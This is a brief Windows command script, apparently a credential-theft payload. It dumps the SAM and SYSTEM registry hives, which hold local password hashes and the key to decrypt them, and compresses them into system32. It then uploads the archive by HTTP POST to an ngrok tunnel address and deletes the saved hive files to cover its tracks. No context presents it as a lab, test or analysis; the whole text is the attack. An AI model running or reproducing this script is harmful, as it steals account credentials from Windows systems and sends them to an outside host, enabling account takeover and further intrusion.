reg save hklm\sam sam;
reg save hklm\system sys;
Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\hives.zip" -Force;
$file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\hives.zip");
iwr "https://monorail-moonlike-afoot.ngrok-free.dev/" -Method POST -Body $file -UseBasicParsing;
remove-item sys;
remove-item sam;
exit
